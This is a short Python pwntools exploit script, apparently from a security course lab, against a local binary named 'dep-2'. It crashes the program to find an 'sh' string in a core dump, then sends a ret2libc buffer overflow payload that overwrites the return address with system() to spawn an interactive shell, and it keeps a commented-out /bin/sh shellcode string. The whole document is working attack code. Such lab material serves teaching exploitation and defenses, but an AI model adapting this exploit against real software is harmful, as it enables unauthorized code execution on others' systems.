#!/usr/bin/env python
from pwn import *

p = process("./dep-2")
#SHELLCODE = 'j2X\xcd\x80PP[YjGX\xcd\x801\xc91\xd2j\x0bX\x99Rhn/shh//biT[\xcd\x80'

#gdb -> b main -> r -> print system
#system = 0xf7eaf7e0
system=0xf7e39da0
#cookie=0xfaceb00c

# causes crash: creates core
#in .c: BUFFSIZE=128+8=136
x="A"*136

p.send(x)
p.wait()
c= Core('core')

sh_addr = c.stack.find('sh')
print("%s"% hex(sh_addr))


p=process("./dep-2")
# slide 44-:
# [buffer] [saved %ebp] [ret addr] [arg 1] [arg2]
#  change saved %ebp to overflow: "AAAA"
#  change ret addr to system()
# [buffer] [ovfl: "AAAA"] [system] [arg 1] [arg 2]
#   Arg 2 of vulnerable func will be Arg 1
#   Arg 1 doesn't matter
# [buffer + 4] [system] [AAAA] [arg 2: addr of shell]
string="A"*140 + p32(system) + "AAAA" + p32(sh_addr)+p32(0x0)

p.send(string)

p.interactive()

